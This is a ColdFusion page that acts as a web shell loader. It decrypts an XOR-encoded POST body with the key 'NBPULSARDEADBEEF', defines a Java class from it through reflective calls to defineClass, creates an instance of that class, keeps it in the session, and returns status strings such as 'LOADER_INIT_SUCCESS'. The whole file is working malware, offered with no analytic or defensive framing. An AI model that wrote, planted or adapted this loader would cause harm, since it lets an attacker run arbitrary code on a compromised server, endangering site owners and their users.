<cfif isDefined("CGI.REQUEST_METHOD") AND CGI.REQUEST_METHOD EQ "POST">
<cfscript>
try
{
    loader = structKeyExists(Session, "pulsar_loader") ? Session.pulsar_loader : "";
    if (NOT isObject(loader))
    {
        // HttpServletRequest, read POST payload (raw body)
        page_context = getPageContext();
        req = page_context.getRequest();
        input_stream = req.getInputStream();

        bos = CreateObject("java", "java.io.ByteArrayOutputStream").init();
        reflect_array = CreateObject("java", "java.lang.reflect.Array");
        byte_class = CreateObject("java", "java.lang.Byte").TYPE;
        buffer = reflect_array.newInstance(byte_class, JavaCast("int", 512));

        length = input_stream.read(buffer);
        while (length GT 0)
        {
            bos.write(buffer, JavaCast("int", 0), JavaCast("int", length));
            length = input_stream.read(buffer);
        }

        encrypted_data = bos.toByteArray();
        data_length = reflect_array.getLength(encrypted_data);

        // XOR decryption
        if (data_length GT 0)
        {
            key_str = "NBPULSARDEADBEEF";
            key_bytes = key_str.getBytes();
            key_length = reflect_array.getLength(key_bytes);

            decrypted_data = reflect_array.newInstance(byte_class, JavaCast("int", data_length));
            for (i = 0; i < data_length; i++)
            {
                data_byte = reflect_array.getByte(encrypted_data, JavaCast("int", i));
                key_byte = reflect_array.getByte(key_bytes, JavaCast("int", (i + 1) % key_length));

                decrypted_byte = bitXor(JavaCast("int", data_byte), JavaCast("int", key_byte));
                reflect_array.setByte(decrypted_data, JavaCast("int", i), JavaCast("byte", decrypted_byte));
            }

            parent_loader = page_context.getClass().getClassLoader();
            url_class = CreateObject("java", "java.lang.Class").forName("java.net.URL");
            url_array = reflect_array.newInstance(url_class, JavaCast("int", 0));

            sandbox_loader = CreateObject("java", "java.net.URLClassLoader").init(url_array, parent_loader);
            class_loader = CreateObject("java", "java.lang.Class").forName("java.lang.ClassLoader");
            string_class = CreateObject("java", "java.lang.Class").forName("java.lang.String");

            params = [
                string_class,
                decrypted_data.getClass(),
                CreateObject("java", "java.lang.Integer").TYPE,
                CreateObject("java", "java.lang.Integer").TYPE
            ];

            define_method = class_loader.getDeclaredMethod("defineClass", params);
            define_method.setAccessible(true);

            obj_class = CreateObject("java", "java.lang.Class").forName("java.lang.Object");
            java_args = reflect_array.newInstance(obj_class, JavaCast("int", 4));

            reflect_array.set(java_args, JavaCast("int", 0), JavaCast("null", ""));
            reflect_array.set(java_args, JavaCast("int", 1), decrypted_data);
            reflect_array.set(java_args, JavaCast("int", 2), JavaCast("int", 0));
            reflect_array.set(java_args, JavaCast("int", 3), JavaCast("int", data_length));

            clazz = define_method.invoke(sandbox_loader, java_args);
                
            constructor_types = reflect_array.newInstance(CreateObject("java", "java.lang.Class").forName("java.lang.Class"), JavaCast("int", 1));
            reflect_array.set(constructor_types, JavaCast("int", 0), class_loader);
            constructor = clazz.getConstructor(constructor_types);
            
            constructor_args = reflect_array.newInstance(obj_class, JavaCast("int", 1));
            reflect_array.set(constructor_args, JavaCast("int", 0), sandbox_loader);
            loader = constructor.newInstance(constructor_args);
            
            Session.pulsar_loader = loader;

            WriteOutput("LOADER_INIT_SUCCESS");
        }
        else
        {
            WriteOutput("LOADER_FAILED: Empty payload received.");
        }
    }
    else
    {
        loader.equals(getPageContext());
    }
}
catch (any e)
{
    ex = structKeyExists(e, "Cause") ? e.Cause.toString() : e.message;
    if (findNoCase("duplicate class definition", ex))
    {
        WriteOutput("LOADER_ALREADY_EXISTS_RESPONSE");
    }
    else
    {
        WriteOutput("LOADER_FAILED: " & e.message & " | Detail: " & (structKeyExists(e, "Detail") ? e.Detail : ""));
    }
}
</cfscript>
</cfif>